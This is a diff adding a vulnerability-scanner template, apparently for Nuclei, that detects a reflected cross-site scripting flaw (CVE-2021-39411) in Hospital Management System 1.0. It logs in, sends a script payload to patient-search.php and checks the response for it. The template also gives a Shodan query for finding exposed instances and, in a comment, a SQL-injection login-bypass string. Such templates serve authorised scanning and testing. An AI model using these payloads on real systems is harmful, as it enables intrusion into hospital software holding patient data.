@@ -1,0 +1,47 @@
+id: hospital-management-xss2
+
+info:
+  name: Hospital Management System 1.0 - Cross-Site Scripting
+  author: arafatansari
+  severity: high
+  description: |
+    Hospital Management System 1.0 contains a cross-site scripting vulnerability via the searchdata parameter in patient-search.php.
+  reference:
+    - https://vulmon.com/vulnerabilitydetails?qid=CVE-2021-39411&scoretype=cvssv3
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
+    cvss-score: 7.2
+    cwe-id: CWE-79
+  metadata:
+    verified: true
+    max-request: 2
+    shodan-query: http.html:"Hospital Management System"
+    comment: Login bypass is also possible using the payload - admin'+or+'1'%3D'1' in username.
+  tags: hms,hospital,cms,xss,authenticated
+
+http:
+  - raw:
+      - |
+        POST /hms/admin/ HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        username={{username}}&password={{password}}&submit=
+      - |
+        POST /hms/admin/patient-search.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        searchdata=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&search=
+
+    req-condition: true
+    cookie-reuse: true
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(header_2, "text/html")'
+          - "status_code_2 == 200"
+          - contains(body_2, 'Result against \"<script>alert(document.domain)</script>\" keyword')
+        condition: and
+
+# digest: 490a0046304402207ece5ef02dbf16eaaa12d540957ad5af5a7d323a9aa569a66f7104c164cc4f61022007506153444c0a49e399b8bfc294884d6c8abf04fe356e442929b67a43a63ae2:922c64590222798bb761d5b6d8e72950
